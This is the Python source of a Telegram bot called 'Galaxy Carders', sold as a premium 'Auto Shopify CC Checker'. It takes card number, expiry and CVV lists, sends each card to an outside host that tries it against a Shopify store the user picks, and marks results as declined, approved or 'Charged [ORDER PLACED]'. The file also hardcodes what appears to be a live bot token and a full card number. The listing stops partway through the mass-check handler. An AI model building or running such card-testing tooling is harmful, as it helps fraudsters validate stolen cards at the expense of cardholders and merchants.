import telebot
import requests
import re
import time
import random
import string
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import json
import os
API_TOKEN = '7422930589:AAHm0WCLv1oXJpoZFf6DVDdVAIDYfJ3F1jU'  # <-- Your actual bot token here
bot = telebot.TeleBot(API_TOKEN, parse_mode="HTML")

user_domains = {}
channel_link = "https://t.me/GalaxyBio"
admin_contact = "https://t.me/Galaxy_Carder"  # Change to your admin/payment link

ADMIN_ID = 6847432039  # <-- Replace with your actual Telegram ID

from telebot.types import Message, ReplyKeyboardMarkup, KeyboardButton

# ━━━━━━━ Footer ━━━━━━━
footer = "\n\n<b>🔗 Powered by:</b> <a href='https://t.me/Galaxy_Carder'>Galaxy Carders</a>"

import re
import os

def load_premium_users():
    if not os.path.exists("id.txt"):
        return []
    with open("id.txt", "r") as f:
        return [int(line.split(":")[0]) for line in f if line.strip()]

def save_user_if_new(user_id, name, username):
    # Check if user is already in users.txt
    if not os.path.exists("users.txt"):
        with open("users.txt", "w"): pass
    with open("users.txt", "r") as f:
        for line in f:
            if line.startswith(str(user_id)):
                return  # Already exists

    # Append new user
    with open("users.txt", "a") as f:
        f.write(f"{user_id},{name},{username or 'N/A'}\n")

# ━━━━━━━ /start ━━━━━━━
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])start\b', message.text or '', re.IGNORECASE)))
def send_welcome(message):
    user = message.from_user
    user_id = user.id
    full_name = user.first_name or "User"
    username = user.username or "N/A"
    user_link = f"<a href='tg://user?id={user_id}'>{full_name}</a>"
    user_status = "Premium 🔓" if user_id in load_premium_users() else "Free 🔒"

    # Save to users.txt
    save_user_if_new(user_id, full_name, username)

    welcome_text = f"""
<b>✨ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞, {user_link}!</b>

<b>🚀 𝐆𝐚𝐥𝐚𝐱𝐲 𝐂𝐚𝐫𝐝𝐞𝐫𝐬 — Auto Shopify CC Checker</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔰 <b>Premium Features:</b>
➤ Blazing-fast Gateway Checks  
➤ Mass & Single Card Support  
➤ Live Gateway Detection + Pricing  
➤ Elegant Bot Responses  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🧠 Tip:</b> Type <code>/cmds</code> to view all available commands.
<b>💬 Tip:</b> Type <code>/help</code> for usage guide.

<b>👑 Status:</b> {user_status}

{footer}
"""
    bot.reply_to(message, welcome_text, parse_mode="HTML", disable_web_page_preview=False)

# ━━━━━━━ /help ━━━━━━━
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])help\b', message.text or '', re.IGNORECASE)))
def help_command(message):
    help_text = f"""
<b>📘 𝐇𝐞𝐥𝐩 𝐌𝐞𝐧𝐮 — 𝐆𝐚𝐥𝐚𝐱𝐲 𝐂𝐚𝐫𝐝𝐞𝐫𝐬</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔧 <b>/seturl</b> – Set your Shopify store domain  
🔍 <b>/myurl</b> – View your saved domain  
❄️ <b>/slf</b> – You Can Card Free In Group Chat  
🏷 <b>/rz</b> – Check Card On Razorpay Gate  
💳 <b>/sh</b> – Check a single card instantly  
📦 <b>/msh</b> – Check up to <b>10 cards</b> at once (inline)  
📄 <b>Send .txt</b> – For mass check (more than 100 cards)  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📥 <b>Card Format:</b>  
<code>5454545454545454|MM|YYYY|CVV</code>

⚠️ <b>Note:</b> /msh supports <b>max 10</b> inline cards.  
Use a <b>.txt</b> file for bulk checking.

{footer}
"""
    bot.reply_to(message, help_text, parse_mode="HTML")


# ━━━━━━━ /cmds ━━━━━━━
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])cmds\b', message.text or '', re.IGNORECASE)))
def show_commands(message):
    cmds_text = f"""
<b>📜 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 <b>/seturl</b> – Set your Shopify domain  
📌 <b>/myurl</b> – Show your current domain  
📌 <b>/sh</b> – Check a single card  
📌 <b>/slf</b> – You Can Card Free In Group Chat  
📌 <b>/rz</b> – Check Card On Razorpay Gate  
📌 <b>/msh</b> – Check up to <b>10 cards</b> inline  
📌 <b>Send .txt</b> – Upload to mass check more than 100 cards  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>Reminder:</b>  
<b>/msh</b> supports a maximum of <b>10</b> cards.  
Use <b>.txt</b> file to check in bulk.

{footer}
"""
    bot.reply_to(message, cmds_text, parse_mode="HTML")


# Load premium users from id.txt
premium_users = {}

def load_premium_users():
    try:
        with open("id.txt", "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid_str, ts_str = line.split(":", 1)
                    try:
                        uid = int(uid_str)
                        ts = float(ts_str)
                        premium_users[uid] = ts
                    except:
                        continue
    except FileNotFoundError:
        print("id.txt not found, no premium users loaded.")

load_premium_users()
def save_premium_users():
    with open("id.txt", "w") as f:
        for uid, ts in premium_users.items():
            f.write(f"{uid}:{ts}\n")

def is_premium(user_id):
    current_time = time.time()
    expiry = premium_users.get(user_id, 0)
    return current_time < expiry

def send_premium_only_message(message):
    markup = InlineKeyboardMarkup(row_width=1)
    buy_button = InlineKeyboardButton(
        text="💎 Buy Premium Access",
        url=admin_contact
    )
    markup.add(buy_button)

    premium_text = (
        "❌ <b>Access Restricted</b>\n\n"
        "This exclusive feature is available <u>only</u> to our <b><i>Premium Members</i></b>.\n\n"
        "Unlock elite access by contacting the administrator for your personalized upgrade.\n\n"
        "💎 <i>Invest in excellence. Experience the difference.</i>"
    )

    bot.reply_to(message, premium_text, reply_markup=markup)

def bin_lookup(bin_number):
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={"Accept-Version": "3", "User-Agent": "BinChecker/1.0"}
        )
        response.raise_for_status()
        data = response.json()

        return {
            "scheme": data.get("scheme", "N/A").upper() if data.get("scheme") else "N/A",
            "type": data.get("type", "N/A").upper() if data.get("type") else "N/A",
            "brand": data.get("brand", "N/A").upper() if data.get("brand") else "N/A",
            "bank": data.get("bank", {}).get("name", "N/A"),
            "country": data.get("country", {}).get("name", "N/A"),
            "currency": data.get("country", {}).get("currency", "N/A"),
            "emoji": data.get("country", {}).get("emoji", "")
        }

    except requests.RequestException as e:
        print(f"[BIN Lookup Error] {e}")
        return {
            "scheme": "N/A",
            "type": "N/A",
            "brand": "N/A",
            "bank": "N/A",
            "country": "N/A",
            "currency": "N/A",
            "emoji": ""
        }

import os
import json
import threading
import time
import html
import cloudscraper
import telebot
import socket
import requests
from datetime import datetime

# ─── Configuration ─────────────────────────────────────────────────────────────

ADMIN_CHAT_ID     = -1002409826126                # ← where errors are forwarded
DATA_FILE         = "sh.json"
MAX_STATUS_LENGTH = 2000

scraper = cloudscraper.create_scraper()

# ─── Persistence Helpers ────────────────────────────────────────────────────────
def load_domains() -> dict:
    if not os.path.exists(DATA_FILE):
        return {}
    try:
        return json.load(open(DATA_FILE))
    except:
        return {}

def save_domains(domains: dict):
    with open(DATA_FILE, "w") as f:
        json.dump(domains, f, indent=2)

def get_user_domain(user_id: int) -> str | None:
    return load_domains().get(str(user_id))

def set_user_domain(user_id: int, domain: str):
    domains = load_domains()
    domains[str(user_id)] = domain
    save_domains(domains)

def remove_user_domain(user_id: int):
    domains = load_domains()
    domains.pop(str(user_id), None)
    save_domains(domains)

# ─── Premium Developer Spinner Driven by API Time ──────────────────────────────
def animate_progress(chat_id: int, msg_id: int, stop_flag: dict, start_time: float):
    frames = ["💎","🚀","✨","🛠️","🔱","📈","🎯","🧩","🧪","🎉"]
    total = len(frames)
    idx = 0
    while not stop_flag.get("stop", False):
        elapsed = time.time() - start_time
        percent = min(int((elapsed / 20) * 100), 100)
        filled  = int(percent / 10)
        bar     = "█"*filled + "░"*(10 - filled)
        text = (
            f"{frames[idx%total]}  <b><i>Processing…</i></b>\n"
            f"<i>Elapsed:</i> <code>{elapsed:.1f}s</code>   <b>{percent}%</b>\n"
            f"{bar}  {frames[idx%total]}"
        )
        try:
            bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML")
        except:
            pass
        time.sleep(0.5)
        idx += 1

    final = time.time() - start_time
    try:
        bot.edit_message_text(
            f"✅ <b><i>Done in {final:.1f}s!</i></b> 🎉",
            chat_id, msg_id, parse_mode="HTML"
        )
    except:
        pass

# ─── Fetch & Display Logic with Unsupported-Site Detection ─────────────────────
def display_domain_info(chat_id: int, domain: str, base_message_id: int):
    start_time = time.time()
    stop_flag  = {"stop": False}

    spinner = threading.Thread(
        target=animate_progress,
        args=(chat_id, base_message_id, stop_flag, start_time),
        daemon=True
    )
    spinner.start()

    try:
        resp    = scraper.get(
            f"http://app17033.cloudwayssites.com/ipx.php?site={domain}&cc=4966230338334896|04|2028|561",
            timeout=20
        )
        raw     = resp.text.strip()
        stop_flag["stop"] = True
        spinner.join()

        # parse JSON
        try:
            data    = resp.json()
            gateway = data.get("Gateway", "Unknown")
            price   = data.get("Price",   "Unknown")
            status  = data.get("Response", raw)
        except:
            gateway, price, status = "Unknown","Unknown", raw

        # handle unsupported
        if gateway == "Unknown":
            remove_user_domain(chat_id)
            bot.send_message(
                ADMIN_CHAT_ID,
                f"⚠️ <b><i>Unsupported site</i></b> removed for <code>{chat_id}</code>:\n"
                f"<pre>{html.escape(domain)}</pre>",
                parse_mode="HTML"
            )
            return bot.edit_message_text(
                "🚫 <b><i>This Shopify site is not supported.</i></b>\n"
                "Your saved domain has been cleared. Please /seturl with a supported one.",
                chat_id, base_message_id, parse_mode="HTML"
            )

        # display styled info
        bot.edit_message_text(
            "🦄 <b><i>✨ Your Current Domain Info ✨</i></b>\n"
            "<pre>━━━━━━━━━━━━━━━━━━━━━</pre>\n"
            f"🌐 <b><i>Domain:</i></b>\n<code>{html.escape(domain)}</code>\n\n"
            f"💳 <b><i>Gateway:</i></b> <code>{html.escape(gateway)}</code>\n"
            f"💰 <b><i>Price:</i></b>   <code>${html.escape(str(price))}</code>\n"
            f"🧾 <b><i>Response:</i></b>\n<pre>{html.escape(status[:MAX_STATUS_LENGTH])}"
            f"{'...(truncated)' if len(status)>MAX_STATUS_LENGTH else ''}</pre>\n"
            "<pre>━━━━━━━━━━━━━━━━━━━━━</pre>",
            chat_id, base_message_id, parse_mode="HTML"
        )

    except Exception as e:
        stop_flag["stop"] = True
        spinner.join()
        bot.send_message(
            ADMIN_CHAT_ID,
            f"🚨 <b><i>Error for user</i></b> <code>{chat_id}</code>:\n"
            f"<pre>{html.escape(str(e))}</pre>",
            parse_mode="HTML"
        )
        bot.edit_message_text(
            "🚫 <b><i>Something went wrong. Please try again later.</i></b>",
            chat_id, base_message_id
        )

# ─── /seturl Handler ──────────────────────────────────────────────────────────
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])seturl\b', message.text or '', re.IGNORECASE)))
def cmd_seturl(message):
    parts = message.text.strip().split(maxsplit=1)
    if len(parts) != 2:
        return bot.reply_to(
            message,
            "⚠️ *How to set your domain*\n\n"
            "Use `/seturl <your_domain>`\n\n"
            "_Example:_\n"
            "`example.com`\n"
            "`shop.example.org`",
            parse_mode="Markdown"
        )

    # take whatever the user provided as the domain
    domain = parts[1].strip().rstrip("/")

    # save it directly (no myshopify.com enforcement)
    set_user_domain(message.chat.id, domain)

    # confirm and fetch info
    confirmation = bot.reply_to(
        message,
        f"✅ *Domain Set Successfully*\n"
        f"`{domain}`\n\n"
        "⏳ Fetching latest info…",
        parse_mode="Markdown"
    )
    display_domain_info(message.chat.id, domain, confirmation.message_id)

# ─── /myurl Handler ──────────────────────────────────────────────────────────
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])myurl\b', message.text or '', re.IGNORECASE)))
def cmd_myurl(message):
    domain = get_user_domain(message.chat.id)
    if not domain:
        return bot.reply_to(
            message,
            "ℹ️ <b><i>No domain set.</i></b> Use /seturl <your_shopify_domain> first.",
            parse_mode="HTML"
        )
    processing = bot.reply_to(message, "⏳ <b><i>Fetching your domain info…</i></b>", parse_mode="HTML")
    display_domain_info(message.chat.id, domain, processing.message_id)


import os
import time
import json
import random
import string
import threading
import re

from datetime import datetime, timedelta, timezone
from telebot import TeleBot

# ————————————————————————————————————————————
# Configuration
# ————————————————————————————————————————————

ADMIN_ID        = 6847432039
LOG_CHANNEL_ID  = -1002409826126

CODES_FILE      = 'codes.json'
PREMIUM_FILE    = 'id.txt'


lock = threading.Lock()

# ————————————————————————————————————————————
# Persistence Helpers
# ————————————————————————————————————————————
def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    with open(CODES_FILE, 'r') as f:
        return json.load(f)

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f)

def load_premium():
    users = {}
    if not os.path.exists(PREMIUM_FILE):
        return users
    with open(PREMIUM_FILE, 'r') as f:
        for line in f:
            uid, ts = line.strip().split(':')
            users[int(uid)] = float(ts)
    return users

def save_premium(users):
    with open(PREMIUM_FILE, 'w') as f:
        for uid, ts in users.items():
            f.write(f"{uid}:{ts}\n")

# ————————————————————————————————————————————
# Startup Cleanup
# ————————————————————————————————————————————
codes = load_codes()
premium_users = load_premium()

# remove any expired premiums
now_ts = time.time()
expired = [uid for uid, exp in premium_users.items() if exp < now_ts]
for uid in expired:
    del premium_users[uid]
if expired:
    save_premium(premium_users)

# ————————————————————————————————————————————
# Code generation & validation
# ————————————————————————————————————————————
def make_redeem_code():
    p1 = ''.join(random.choices(string.ascii_uppercase, k=4))
    p2 = ''.join(random.choices(string.ascii_uppercase, k=4))
    return f"GALAXY-{p1}-{p2}-CARDER"

CODE_PATTERN = re.compile(r"^GALAXY-[A-Z]{4}-[A-Z]{4}-CARDER$")

# ————————————————————————————————————————————
# /code → generate new redeem codes
# ————————————————————————————————————————————
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])code\b', message.text or '', re.IGNORECASE)))
def generate_code(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "❌ You are not authorized.")

    parts = message.text.strip().split()
    if len(parts) != 2 or not parts[1].isdigit():
        return bot.reply_to(
            message,
            "⚠️ Usage: `/code <days>`\nExample: `/code 30`",
            parse_mode='Markdown'
        )

    days = int(parts[1])
    code = make_redeem_code()
    expiry_dt = datetime.now(timezone.utc) + timedelta(days=days)
    expiry_ts = expiry_dt.timestamp()

    codes[code] = {"expiry": expiry_ts, "days": days}
    save_codes(codes)

    expires_str = expiry_dt.strftime("%Y-%m-%d %H:%M UTC")
    text = (
        "┏━🎁━ *Code Generated!* ━🎁━┓\n"
        f"*🔑 Your Code:* `{code}`\n"
        f"*⏳ Valid for:* *{days}* day{'s' if days!=1 else ''}\n"
        f"*⌛ Expires on:* _{expires_str}_\n"
        "┗━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"_Use_ `/redeem {code}` _to activate premium now!_"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

# ————————————————————————————————————————————
# /redeem → consume codes & grant premium
# ————————————————————————————————————————————
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])redeem\b', message.text or '', re.IGNORECASE)))
def redeem_code(message):
    parts = message.text.strip().split()
    if len(parts) != 2:
        return bot.reply_to(
            message,
            "⚠️ Usage: `/redeem <code>`",
            parse_mode='Markdown'
        )

    code = parts[1].upper()
    if not CODE_PATTERN.match(code):
        return bot.reply_to(
            message,
            "❌ Invalid code format.",
            parse_mode='Markdown'
        )

    info = codes.get(code)
    now_ts = time.time()
    if not info or now_ts > info['expiry']:
        codes.pop(code, None)
        save_codes(codes)
        return bot.reply_to(
            message,
            "❌ Code invalid or expired.",
            parse_mode='Markdown'
        )

    days = info['days']
    user_id = message.from_user.id

    with lock:
        current = premium_users.get(user_id, now_ts)
        new_expiry = max(current, now_ts) + days * 86400
        premium_users[user_id] = new_expiry

        # consume the code
        codes.pop(code, None)
        save_codes(codes)
        save_premium(premium_users)

    new_expiry_dt = datetime.fromtimestamp(new_expiry, timezone.utc)
    expires_str = new_expiry_dt.strftime("%Y-%m-%d %H:%M UTC")

    # log redemption with full name & profile link
    user = message.from_user
    full_name = " ".join(filter(None, [user.first_name, user.last_name]))
    log_text = (
        "┏━🎟️━ <b>Code Redeemed</b> ━🎟️━┓\n"
        f"┃ 👤 <b>User:</b> <a href=\"tg://user?id={user.id}\">{full_name}</a> (`{user.id}`)\n"
        f"┃ ⏳ <b>Duration:</b> <i>{days} day{'s' if days!=1 else ''}</i>\n"
        f"┃ 🔒 <b>New Expiry:</b> <code>{expires_str}</code>\n"
        "┗━━━━━━━━━━━━━━━━━━━━━┛"
    )
    bot.send_message(
        LOG_CHANNEL_ID,
        log_text,
        parse_mode='HTML',
        disable_web_page_preview=True
    )

    # confirm to user
    reply = (
        "┏━✅━ <b>Premium Activated!</b> ━✅━┓\n"
        f"• <b>Duration:</b> <i>{days} day{'s' if days!=1 else ''}</i>\n"
        f"• <b>Expires on:</b> <i>{expires_str}</i>\n"
        "┗━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "<i>Thank you for being premium!</i>"
    )
    bot.reply_to(message, reply, parse_mode='HTML')

# ————————————————————————————————————————————
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time

ADMIN_ID = 6847432039
LOG_CHANNEL = -1002409826126  # Log Channel

# Load from id.txt (chat_id:timestamp)
def load_premium_users():
    users = {}
    try:
        with open("id.txt", "r") as f:
            for line in f:
                if ":" in line:
                    uid, expiry = line.strip().split(":")
                    users[int(uid)] = float(expiry)
    except:
        pass
    return users

premium_users = load_premium_users()
lock = threading.Lock()

# Save updated id.txt
def save_premium(users):
    with open("id.txt", "w") as f:
        for uid, ts in users.items():
            f.write(f"{uid}:{ts}\n")

# Check if user is premium and not expired
def is_premium(uid):
    if uid in premium_users:
        if time.time() < premium_users[uid]:
            return True
        else:
            # Expired, remove
            with lock:
                premium_users.pop(uid)
                save_premium(premium_users)
            notify_expired_user(uid)
            notify_admin(uid, expired=True)
    return False

# Send renew message to user
def notify_expired_user(uid):
    try:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔁 Renew Plan", url="https://t.me/Galaxy_Carder"))
        msg = (
            "<b>❌ Your Checker Premium Plan Has Expired.</b>\n"
            "🔁 <i>Click below to renew your plan and regain full access.</i>"
        )
        bot.send_message(uid, msg, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        print(f"[WARN] Could not notify expired user {uid}: {e}")

# Send log to log channel
def notify_admin(uid, expired=False):
    try:
        msg = (
            f"⚠️ <b>User Removed</b>\n"
            f"<b>User ID:</b> <code>{uid}</code>\n"
            f"<b>Reason:</b> {'Expired' if expired else 'Removed by Admin'}"
        )
        bot.send_message(LOG_CHANNEL, msg, parse_mode="HTML")
    except Exception as e:
        print(f"[WARN] Failed to log admin action: {e}")

# ━━━━━━━ /remove command ━━━━━━━
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])remove\b', message.text or '', re.IGNORECASE)))
def remove_user(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "❌ You are not authorized.")

    parts = message.text.strip().split()
    if len(parts) != 2 or not parts[1].isdigit():
        return bot.reply_to(
            message,
            "⚠️ Usage: `/remove <chat_id>`",
            parse_mode='Markdown'
        )

    uid = int(parts[1])
    if uid in premium_users:
        with lock:
            premium_users.pop(uid, None)
            save_premium(premium_users)

        # Send notification to user & log
        notify_expired_user(uid)
        notify_admin(uid, expired=False)

        bot.reply_to(
            message,
            f"🗑️ <b>Premium Revoked</b>\nUser <code>{uid}</code> has lost premium access.",
            parse_mode='HTML'
        )
    else:
        bot.reply_to(
            message,
            f"ℹ️ User <code>{uid}</code> has no premium to remove.",
            parse_mode='HTML'
        )

# ————————————————————————————————————————————
# Background cleanup: remove expired premiums hourly
# ————————————————————————————————————————————
def cleanup_expired():
    while True:
        now_ts = time.time()
        with lock:
            to_del = [uid for uid, exp in premium_users.items() if exp < now_ts]
            for uid in to_del:
                premium_users.pop(uid, None)
            if to_del:
                save_premium(premium_users)
        time.sleep(3600)

threading.Thread(target=cleanup_expired, daemon=True).start()

# ————————————————————————————————————————————



@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])sh\b', message.text or '', re.IGNORECASE)))
def handle_sh(message):
    user_id = message.from_user.id
    user_id_str = str(user_id)

    if not is_premium(user_id):
        send_premium_only_message(message)
        return

    try:
        start = time.time()

        full_name = message.from_user.first_name or "User"
        user_link = f"<a href='tg://user?id={user_id}'>{full_name}</a>"

        domain = get_user_domain(user_id)
        if not domain:
            bot.reply_to(message, "❌ You must set a domain first using /seturl")
            return

        args = message.text.split(' ', 1)
        if len(args) != 2:
            bot.reply_to(message, "Usage: /sh card|MM|YYYY|CVV")
            return

        pattern = r'^(\d{12,19})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$'
        match = re.match(pattern, args[1].strip())
        if not match:
            bot.reply_to(message, "Invalid format. Use:\n/sh card|MM|YYYY|CVV")
            return

        card, mm, yyyy, cvv = match.groups()
        if len(yyyy) == 2:
            yyyy = "20" + yyyy

        fullz = f"{card}|{mm}|{yyyy}|{cvv}"
        bin_number = card[:6] if len(card) >= 6 else "000000"
        

        bot.send_chat_action(message.chat.id, 'typing')
        processing_msg = bot.send_message(
            message.chat.id,
            "❝ <b>📥 Your request has been received...</b> ❞",
            parse_mode="HTML"
        )
        time.sleep(1.5)

        bot.edit_message_text(
            "❝ <b>⏳ Connecting to Gateway...</b> ❞",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )

        api_url = f"https://app17033.cloudwayssites.com/ipx.php?site={domain}&cc={fullz}"
        headers = {"User-Agent": "Mozilla/5.0"}
        response = requests.get(api_url, headers=headers, timeout=30)
        data = response.json()

        gateway = data.get("Gateway", "Shopify Normal")
        price = data.get("Price", "0.00")
        status = data.get("Response", "").upper()

        bot.edit_message_text(
            f"❝ <b>💳 Card:</b> <code>{fullz}</code>\n"
            f"<b>🌐 Gateway:</b> {gateway} — ${price} ❞",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )
        time.sleep(2)

        bot.edit_message_text(
            "❝ <b>✅ Gateway response received!\n📦 Preparing final result...</b> ❞",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )
        time.sleep(1.5)

        elapsed = f"{(time.time() - start):.2f}"
        bin_data = bin_lookup(bin_number)

        decline_list = [
            "GENERIC_ERROR", "AUTHORIZATION_ERROR", "CARD_DECLINED",
            "INCORRECT_NUMBER", "UNPROCESSABLE_TRANSACTION",
            "PROCESSING_ERROR", "EXPIRED_CARD", "CARD TOKEN IS EMPTY", "FRAUD_SUSPECTED", "INVAILD_CVC", "PICK_UP_CARD", "DECLINED", "INVAILD_PAYMENT_ERROR", "INCORRECT_ZIP"
        ]
        approve_list = ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "3D CC", "3D_AUTHENTICATION"]
        unknown_list = ["INVALID URL", "HANDLE IS EMPTY", "RECEIPT ID IS EMPTY", "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL"]

        if status in decline_list:
            status_display = "Declined ❌"
        elif status in approve_list:
            status_display = "Approved ❎"
        elif status in unknown_list:
            status_display = "Unknown Error ⚠️"
        else:
            status_display = "Charged 🔥 [ORDER PLACED]"

        result = f"""
<b>╔════════════════════╗</b>
<b>   ✦✧   𝓐𝓤𝓣𝓞 • 𝓢𝓗𝓞𝓟𝓘𝓕𝓨    ✧✦</b>
<b>╠════════════════════╣</b>

<b>🔐  <a href="{channel_link}">𝓒𝓪𝓻𝓭</a>:</b>  <code>{fullz}</code>
<b>📊  <a href="{channel_link}">𝓢𝓽𝓪𝓽𝓾𝓼</a>:</b>  <b>{status_display}</b>
<b>🧾  <a href="{channel_link}">𝓡𝓮𝓼𝓹𝓸𝓷𝓼𝓮</a>:</b>  <code>{status}</code>
<b>💳  <a href="{channel_link}">𝓖𝓪𝓽𝓮𝔀𝓪𝔂</a>:</b>  <code>{gateway}</code> — <b><a href="{channel_link}">💵 {price} USD</a></b>

<b>╠════════════════════════╣</b>

<b>🔍 𝓑𝓲𝓷 𝓘𝓷𝓯𝓸𝓻𝓶𝓪𝓽𝓲𝓸𝓷</b>
<b> • </b> <a href="{channel_link}">🌐</a>  <b>𝓢𝓬𝓱𝓮𝓶𝓮:</b>  <i>{bin_data.get('scheme', 'N/A')}</i>
<b> • </b> <a href="{channel_link}">💠</a>  <b>𝓣𝔂𝓹𝓮:</b>  <i>{bin_data.get('type', 'N/A')}</i>
<b> • </b> <a href="{channel_link}">🎯</a>  <b>𝓑𝓻𝓪𝓷𝓭:</b>  <i>{bin_data.get('brand', 'N/A')}</i>
<b> • </b> <a href="{channel_link}">🏦</a>  <b>𝓑𝓪𝓷𝓴:</b>  <i>{bin_data.get('bank', 'N/A')}</i>
<b> • </b> <a href="{channel_link}">🌍</a>  <b>𝓒𝓸𝓾𝓷𝓽𝓻𝔂:</b>  <i>{bin_data.get('emoji', '')} {bin_data.get('country', 'N/A')} ({bin_data.get('currency', 'N/A')})</i>

<b>╠═══════════════════════╣</b>

<b>✅ 𝓒𝓱𝓮𝓬𝓴𝓮𝓭 𝓑𝔂:</b> {user_link}  
<b>⏱ 𝓣𝓲𝓶𝓮 𝓣𝓪𝓴𝓮𝓷:</b>  <code>{elapsed} seconds</code>

<b>🔗 𝓙𝓸𝓲𝓷 𝓞𝓾𝓻 𝓒𝓱𝓪𝓷𝓷𝓮𝓵:</b>  <a href="{channel_link}">Galaxy Carders</a>

<b>╚════════════════════════╝</b>
"""
        bot.edit_message_text(
            result,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    except Exception as e:
        try:
            stop_flag['stop'] = True
            thread.join()
        except:
            pass
        bot.reply_to(message, f"<b>Error:</b> <code>{e}</code>", parse_mode="HTML")
        
import json
import time
import re
import requests

# Load user domains from sh.json once (or reload as needed)
def load_domains():
    try:
        with open("sh.json", "r") as f:
            return json.load(f)
    except:
        return {}

@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])msh\b', message.text or '', re.IGNORECASE)))
def handle_msh(message):
    user_id = str(message.from_user.id)
    start_time = time.time()

    # Load domains fresh per command so updates are recognized
    user_domains = load_domains()

    # Check premium access
    if not is_premium(int(user_id)):
        send_premium_only_message(message)
        return

    # Check domain for user
    if user_id not in user_domains:
        bot.reply_to(message, "❌ You must set a domain first using /seturl")
        return
    domain = user_domains[user_id]

    # Extract cards from message text (skip command line)
    lines = message.text.split('\n')[1:]
    if not lines:
        bot.reply_to(message, "❌ Please provide cards below the /msh command.")
        return
    cards = lines[:10]  # limit to 10 cards

    decline_list = [
        "GENERIC_ERROR", "AUTHORIZATION_ERROR", "CARD_DECLINED",
        "DECLINED", "INCORRECT_NUMBER", "UNPROCESSABLE_TRANSACTION",
        "PROCESSING_ERROR", "EXPIRED_CARD", "CARD TOKEN IS EMPTY", "FRAUD_SUSPECTED", "PICK_UP_CARD", "INVAILD_PAYMENT_ERROR", "INVAILD_CVC", "INCORRECT_ZIP"
    ]
    approve_list = ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "3D CC", "3D_AUTHENTICATION"]
    unknown_list = ["INVALID URL", "HANDLE IS EMPTY", "RECEIPT ID IS EMPTY", "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL"]

    # Initial message with header and 0 progress
    text = (f"<b>『 Mass Auto Shopify [ /msh ] 』</b>\n"
            "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
            f"<b>Progress ➜</b> [0 / {len(cards)}]\n\n"
            "Processing cards, please wait...\n")
    sent_msg = bot.reply_to(message, text, parse_mode="HTML")

    # Build results progressively
    results = []

    for idx, card_line in enumerate(cards, start=1):
        line = card_line.strip()
        if not re.match(r'^\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}$', line):
            results.append(f"Card ➜ {line}\nStatus ➜ Invalid Format ⚠️\n")
        else:
            card, mm, yyyy, cvv = line.split('|')
            if len(yyyy) == 2:
                yyyy = "20" + yyyy
            fullz = f"{card}|{mm}|{yyyy}|{cvv}"

            try:
                api_url = f"https://app17033.cloudwayssites.com/ipx.php?site={domain}&cc={fullz}"
                headers = {"User-Agent": "Mozilla/5.0"}
                response = requests.get(api_url, headers=headers, timeout=20)
                data = response.json()

                status = data.get("Response", "").upper()

                if status in decline_list:
                    status_display = "Declined ❌"
                elif status in approve_list:
                    status_display = "Approved ❎"
                elif status in unknown_list:
                    status_display = "Unknown Error ⚠️"
                else:
                    status_display = "Charged 🔥 [ORDER PLACED]"

                results.append(
                    f"<b>Card ➜</b> {fullz}\n"
                    f"<b>Status ➜</b> {status_display}\n"
                    f"<b>Response ➜</b> {status}\n"
                )

            except Exception as e:
                results.append(
                    f"<b>Card ➜</b> {fullz}\n<b>Status ➜</b> Error 🚫\n<b>Response ➜</b> {str(e)}\n"
                )

        # Update progress message after each card
        progress_text = (f"<b>『 Mass Auto Shopify [ /msh ] 』</b>\n"
                         "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
                         f"<b>Progress ➜</b> [{idx} / {len(cards)}]\n\n"
                         + '\n'.join(results))
        try:
            bot.edit_message_text(progress_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
        except Exception:
            # Sometimes editing too fast or no change can cause exceptions; ignore
            pass

        time.sleep(1.5)

    # Final summary with time and user info
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

